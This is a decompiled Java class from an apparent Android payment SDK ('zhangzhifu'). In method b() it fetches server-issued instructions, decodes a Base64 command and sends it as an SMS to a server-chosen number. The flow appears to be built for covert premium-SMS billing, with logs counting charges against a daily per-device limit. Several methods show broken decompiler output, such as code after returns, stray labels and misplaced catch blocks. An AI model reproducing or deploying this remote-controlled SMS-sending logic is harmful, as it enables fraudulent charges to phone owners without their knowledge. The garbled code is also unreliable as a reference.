package com.zhangzhifu.sdk.onlinegame;

import android.content.Context;
import android.util.Base64;
import com.waterwest.mmlog.TrustInfo;
import com.zhangzhifu.sdk.db.MMRWapDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.MMRProcedure;
import com.zhangzhifu.sdk.modle.MMRWap;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.Tools;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.sms.SendSMS;
import java.io.PrintStream;
import java.util.Iterator;
import java.util.List;
import org.apache.http.HttpResponse;
import org.json.JSONException;
import org.json.JSONObject;

public class ZhangPayMMRF
{
  public static int allFlow;
  private static ZhangPayMMRF ap;
  public static String currentWapUrl;
  private Context ao;
  private String aq;
  private boolean ar = false;
  private String as = null;
  private HttpResponse at = null;
  private MMRProcedure au;
  private String av = null;
  private String contentsid = null;
  public int count;
  public boolean isSend = false;
  public boolean isSendNext = false;
  
  public ZhangPayMMRF(Context paramContext)
  {
    this.ao = paramContext;
  }
  
  private String a(Context paramContext, String paramString)
  {
    String str1 = null;
    Object localObject = Tools.getContentByCMWAP(paramString + "&contentid=" + this.contentsid, Tools.getHeadersByDefault(paramContext, null, null), paramContext);
    paramString = str1;
    if (localObject != null)
    {
      localObject = Tools.getBody((HttpResponse)localObject, paramContext);
      paramString = str1;
      if (localObject == null) {}
    }
    try
    {
      localObject = new JSONObject((String)localObject);
      paramString = ((JSONObject)localObject).getString("resultCode");
      str1 = paramString;
      String str2;
      String str3;
      String str4;
      String str5;
      paramContext.printStackTrace();
    }
    catch (JSONException paramContext)
    {
      try
      {
        if (paramString.equals("000"))
        {
          str1 = ((JSONObject)localObject).getString("appid");
          str2 = ((JSONObject)localObject).getString("sdkVersion");
          str3 = ((JSONObject)localObject).getString("versionCode");
          str4 = ((JSONObject)localObject).getString("packageName");
          str5 = ((JSONObject)localObject).getString("channel");
          TrustInfo.init(paramContext, str2, str1, ((JSONObject)localObject).getString("channelId"), ((JSONObject)localObject).getString("programId"), ((JSONObject)localObject).getString("versionName"), str3, str4, ((JSONObject)localObject).getString("app_md5"), str5);
          str1 = paramString;
        }
        return str1;
      }
      catch (JSONException paramContext)
      {
        for (;;) {}
      }
      paramContext = paramContext;
      paramString = null;
    }
    return paramString;
  }
  
  private String b(Context paramContext, String paramString)
  {
    try
    {
      paramString = Tools.getContentByCMWAP(paramString + "&contentid=" + this.contentsid, Tools.getHeadersByDefault(paramContext, null, null), paramContext);
      Object localObject1 = null;
      if (paramString == null) {
        break label505;
      }
      paramString = Tools.getBody(paramString, paramContext);
      localObject1 = null;
      if (paramString == null) {
        break label505;
      }
      localObject2 = new JSONObject(paramString);
      paramString = ((JSONObject)localObject2).getString("resultCode");
      localObject1 = paramString;
      try
      {
        if (!paramString.equals("0000")) {
          break label505;
        }
        this.contentsid = ((JSONObject)localObject2).getString("contentsid");
        str4 = ((JSONObject)localObject2).getString("smstype");
        str3 = ((JSONObject)localObject2).getString("cmd");
        str2 = ((JSONObject)localObject2).getString("port");
        String str5 = ((JSONObject)localObject2).getString("init_sms");
        String str6 = ((JSONObject)localObject2).getString("init_sms_number");
        String str7 = ((JSONObject)localObject2).getString("pay_code");
        String str8 = ((JSONObject)localObject2).getString("package_name");
        String str9 = ((JSONObject)localObject2).getString("version_type");
        String str10 = ((JSONObject)localObject2).getString("version_code");
        String str11 = ((JSONObject)localObject2).getString("version_name");
        String str12 = ((JSONObject)localObject2).getString("app_id");
        String str13 = ((JSONObject)localObject2).getString("channel_id");
        String str14 = ((JSONObject)localObject2).getString("program_id");
        String str15 = ((JSONObject)localObject2).getString("esm");
        String str16 = ((JSONObject)localObject2).getString("mdh");
        String str17 = ((JSONObject)localObject2).getString("pkm");
        String str18 = ((JSONObject)localObject2).getString("tid");
        String str19 = ((JSONObject)localObject2).getString("timestamp");
        String str20 = ((JSONObject)localObject2).getString("sda");
        String str21 = ((JSONObject)localObject2).getString("channel");
        localObject2 = ((JSONObject)localObject2).getString("app_md5");
        localObject1 = paramString;
        if (str8 == "") {
          break label505;
        }
        localObject1 = paramString;
        if (str14 == "") {
          break label505;
        }
        TrustInfo.auth(paramContext, str8, str10, str11, str12, str7, str18, str9, str13, str14, str19, str15, str16, str17, str20, (String)localObject2, str21);
        localObject2 = new SendSMS();
        boolean bool = str4.equals("1");
        if (!bool) {
          break label441;
        }
        if (str5 != "") {
          ((SendSMS)localObject2).sendSMS(paramContext, str6, str5, null);
        }
        try
        {
          Thread.sleep(2000L);
          localObject1 = Base64.decode(str3, 0);
          System.out.println("MMR已经发短信smsData");
          ((SendSMS)localObject2).sendSMS(paramContext, str2, null, (byte[])localObject1);
          SharePreferUtil.setSendSMSMMQ(paramContext, 1);
          return paramString;
        }
        catch (InterruptedException localInterruptedException)
        {
          for (;;)
          {
            localInterruptedException.printStackTrace();
          }
        }
        paramContext.printStackTrace();
      }
      catch (JSONException paramContext) {}
    }
    catch (JSONException paramContext)
    {
      for (;;)
      {
        Object localObject2;
        String str4;
        String str3;
        String str2;
        label441:
        paramString = null;
      }
    }
    return paramString;
    String str1 = paramString;
    if (str4.equals("0"))
    {
      str1 = new String(Base64.decode(str3.toString(), 0));
      System.out.println("MMR已经发短信smsText");
      ((SendSMS)localObject2).sendSMS(paramContext, str2, str1, null);
      SharePreferUtil.setSendSMSMMQ(paramContext, 1);
      return paramString;
    }
    label505:
    return str1;
  }
  
  public static ZhangPayMMRF getInstance(Context paramContext)
  {
    if (ap == null) {
      ap = new ZhangPayMMRF(paramContext);
    }
    return ap;
  }
  
  public void deelOnlineGameWap(List paramList)
  {
    if ((paramList != null) && (paramList.size() > 0)) {
      paramList = paramList.iterator();
    }
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      MMRWap localMMRWap = (MMRWap)paramList.next();
      if (!JudgeTimeUtil.isMax(2, this.ao)) {
        break;
      }
      if (localMMRWap == null)
      {
        ZhangPayLog.d("zhangPay_log", "计费失败");
      }
      else if ((localMMRWap.getAllProcedure() != null) && (localMMRWap.getAllProcedure().size() != 0))
      {
        new a(this, localMMRWap).execute(new String[] { "" });
        MMRWapDBManager.getInstance().delWapById(this.ao, localMMRWap);
      }
    }
    SharePreferUtil.getInstance().setSmsResult(this.ao, 1005);
    ZhangPayLog.d("zhangPay_log", "该设备今日已超过可计费次数上限");
  }
}
